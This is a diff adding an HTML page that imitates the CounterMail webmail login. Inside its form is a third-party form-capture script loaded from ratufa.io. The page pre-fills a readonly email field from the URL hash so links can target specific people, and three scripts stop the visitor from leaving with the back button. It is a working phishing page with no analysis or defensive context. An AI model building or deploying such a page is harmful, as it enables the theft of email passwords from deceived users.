@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CounterMail Webmail v2.0</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            /* Carbon fiber textured background simulation matching the exact dark pattern */
+            background-color: #1a1a1a;
+            background-image: radial-gradient(#262626 15%, transparent 16%),
+                              radial-gradient(#262626 15%, transparent 16%);
+            background-size: 8px 8px;
+            background-position: 0 0, 4px 4px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        /* Floating Dark Container Module Card */
+        .login-card {
+            background-color: #2b2b2b;
+            border: 1px solid #3d3d3d;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 440px;
+            padding: 32px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 1px 2px rgba(255,255,255,0.05);
+            margin-bottom: 24px;
+        }
+
+        /* Logo Branding Area - Khaki Green Accent Color Selection */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .brand-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #7fa655; /* Signature Khaki Green color matching CounterMail */
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .brand-title span.lock-icon {
+            color: #b0b0b0;
+            font-size: 22px;
+        }
+
+        .brand-subtitle {
+            font-size: 11px;
+            color: #888888;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 4px;
+            font-weight: bold;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        /* Horizontal Layout Form Fields Alignment Stack */
+        .form-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+
+        .form-row label {
+            width: 100px;
+            color: #cccccc;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .input-container {
+            flex: 1;
+        }
+
+        /* Dark gloss background fields featuring a crisp, vibrant green focus border outline frame */
+        .form-control {
+            width: 100%;
+            background-color: #151515;
+            border: 1px solid #444444;
+            padding: 8px 10px;
+            font-size: 14px;
+            color: #ffffff;
+            outline: none;
+            border-radius: 2px;
+            transition: border-color 0.2s;
+        }
+
+        .form-control:focus {
+            border-color: #7fa655;
+            box-shadow: 0 0 4px rgba(127, 166, 85, 0.4);
+        }
+
+        /* Button Ribbon Wrapper Row Component Elements Matrix */
+        .action-row {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            padding-left: 100px; /* Aligns buttons right next to field inputs column line */
+            margin-top: 24px;
+        }
+
+        /* Gray Gloss rectangular structural buttons precise reproduction blueprints */
+        .btn-base {
+            border: 1px solid #444444;
+            background: linear-gradient(to bottom, #555555 0%, #333333 100%);
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            transition: background 0.1s ease;
+        }
+
+        .btn-base:hover {
+            background: linear-gradient(to bottom, #626262 0%, #3a3a3a 100%);
+        }
+
+        .btn-login {
+            padding: 8px 24px;
+            font-size: 14px;
+        }
+
+        .btn-secondary {
+            padding: 8px 12px;
+            font-size: 11px;
+            color: #cccccc;
+            text-transform: uppercase;
+        }
+
+        /* Bottom Application Version Information Frame label */
+        .version-label {
+            font-size: 12px;
+            color: #555555;
+            text-align: center;
+        }
+
+        /* Desktop environment layout decoration system watermark overlay reproduction */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.08);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Center Floating Interface Card Panel Workspace Component -->
+    <main class="login-card">
+        
+        
+        <div class="logo-container">
+            <h1 class="brand-title">Countermail <span class="lock-icon">🔒</span></h1>
+            <div class="brand-subtitle">Protecting your privacy</div>
+        </div>
+    
+        <!-- Form submission configuration using standard action targets -->
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+            <div class="form-row">
+                <label for="username">Username</label>
+                <div class="input-container">
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+            </div>
+
+            <div class="form-row">
+                <label for="password">Password</label>
+                <div class="input-container">
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+            </div>
+
+            <!-- Custom Button Tray Strip Elements Grid Component -->
+            <div class="action-row">
+                <button type="submit" class="btn-base btn-login">Login</button>
+                <button type="button" class="btn-base btn-secondary">USB</button>
+                <button type="button" class="btn-base btn-secondary">PGP-key</button>
+            </div>
+
+        </form>
+    </main>
+
+    <!-- Bottom Footnote Signature Marker -->
+    <div class="version-label">CounterMail Webmail v2.0</div>
+
+  
+ <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+</body>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</html>
